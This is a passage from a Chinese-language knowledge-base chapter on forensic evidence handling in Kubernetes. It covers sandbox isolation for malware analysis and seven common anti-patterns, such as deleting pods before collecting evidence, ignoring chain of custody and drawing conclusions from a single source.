|------|------|---------|
| 网络隔离 | 防止恶意样本外连 | NetworkPolicy 禁止所有出站 |
| 存储隔离 | 防止证据交叉污染 | 每次分析使用独立 PV |
| 身份隔离 | 限制分析人员权限 | 专用 ServiceAccount + 最小 RBAC |
| 操作审计 | 记录所有分析操作 | 审计日志 RequestResponse 级别 |
| 环境清理 | 防止残留信息泄露 | 分析完成后自动销毁 Namespace |

---

<!-- chunk: 3.8 常见陷阱与反模式 -->## 3.8 常见陷阱与反模式

#<!-- chunk: 反模式一："事后再说" -->## 反模式一："事后再说"

```
❌ "等出了问题再开始采集证据"

问题:
  • 容器已终止，内存/进程状态永久丢失
  • 日志可能已被轮转覆盖
  • Kubernetes Events 已过期清除
  • 攻击者可能已清理痕迹

✓ 正确做法: 建立持续取证姿态，始终在线采集
```

#<!-- chunk: 反模式二："采集一切" -->## 反模式二："采集一切"

```
❌ "把所有日志、指标、追踪都存起来，什么都不丢"

问题:
  • 存储成本指数级增长 (大规模集群可达 PB 级/月)
  • 分析效率急剧下降 (信噪比过低)
  • 关键证据被海量噪音淹没
  • 合规要求的证据反而因为存储系统过载而丢失

✓ 正确做法: 分层采集，智能过滤，按易失性和价值排序
```

#<!-- chunk: 反模式三：忽略 Chain of Custody -->## 反模式三：忽略 Chain of Custody

```
❌ "直接 kubectl logs 看看就行"

问题:
  • 无法证明证据未被篡改
  • 合规审计无法通过
  • 法律程序中证据可能被质疑
  • 无法确认谁在何时查看/修改了证据

✓ 正确做法: 所有证据操作记录完整的保管链
```

#<!-- chunk: 反模式四：单源结论 -->## 反模式四：单源结论

```
❌ "日志里说是 OOM，那就是内存不够"

问题:
  • 单一证据源可能不完整或误导
  • OOM 可能是内存泄漏、配置错误、或攻击者行为
  • 未考虑替代假设

✓ 正确做法: 多源交叉验证，至少 2-3 个独立证据源指向同一结论
```

#<!-- chunk: 反模式五：时间不同步 -->## 反模式五：时间不同步

```
❌ "各个节点的时间差个几秒没关系"

问题:
  • 跨源时间线重建失败
  • 因果关系判断错误 (可能颠倒先后顺序)
  • 在秒级操作的 K8s 环境中，几秒的误差可能导致完全错误的结论

✓ 正确做法: 所有节点 NTP 同步，时间精度 < 1ms
```

#<!-- chunk: 反模式六：修复时覆盖证据 -->## 反模式六：修复时覆盖证据

```
❌ "先 kubectl delete pod 重启，再看看日志"

问题:
  • 删除 Pod 会销毁容器内的所有运行时证据
  • 新 Pod 的日志覆盖旧 Pod 的日志引用
  • 攻击者的持久化机制可能在新 Pod 中继续运行

✓ 正确做法: 先创建检查点/采集证据，再执行修复操作
```

#<!-- chunk: 反模式七：工具版本不一致 -->## 反模式七：工具版本不一致

```
❌ "不同分析师用不同版本的 Volatility 分析同一份内存转储"

问题:
  • 不同版本可能解析出不同结果
  • 分析结果不可复现
  • 合规审计中无法证明工具的一致性

✓ 正确做法: Forensics as Code，工具版本锁定在 Git 仓库中
```

---

> **导航**: [<< 上一章 - FEBM 技术实现体系](./02-febm-technical-implementation.md) | [下一章 - FEBM 对云平台工单智能体托管的意义 >>](./04-febm-agent-ticket-processing.md)

---

<!-- chunk: Obsidian 相关文档 -->## Obsidian 相关文档

- [[domain-10-troubleshooting-diagnostics/topic-febm/MOC.md|topic-febm MOC]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/README.md|topic-febm: FEBM 法医鉴定循证方法论深度解析]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/01-febm-theory-foundations.md|第一章：FEBM 方法论原理与理论基础]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/02-febm-technical-implementation.md|第二章:FEBM 技术实现体系]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/04-febm-agent-ticket-processing.md|第四章：FEBM 对云平台工单智能体托管的意义]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/05-febm-construction-methodology.md|第五章：FEBM 体系建设方法论]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/06-febm-future-evolution.md|第六章：未来演进方向]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/07-febm-appendix.md|第七章:附录]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/08-febm-production-quick-start.md|第八章：FEBM 生产环境快速启动与 Kubernetes 故障取证手册]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/febm-methodology-deep-dive.md|法医鉴定循证方法论（FEBM）深度解析]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/fta-febm-joint-diagnosis.md|FTA-FEBM 联合诊断最佳实践]]

## See Also

- [[domain-10-troubleshooting-diagnostics/topic-febm/01-febm-theory-foundations.md|01-febm-theory-foundations]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/02-febm-technical-implementation.md|02-febm-technical-implementation]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/04-febm-agent-ticket-processing.md|04-febm-agent-ticket-processing]]
- [[domain-10-troubleshooting-diagnostics/topic-febm/05-febm-construction-methodology.md|05-febm-construction-methodology]]
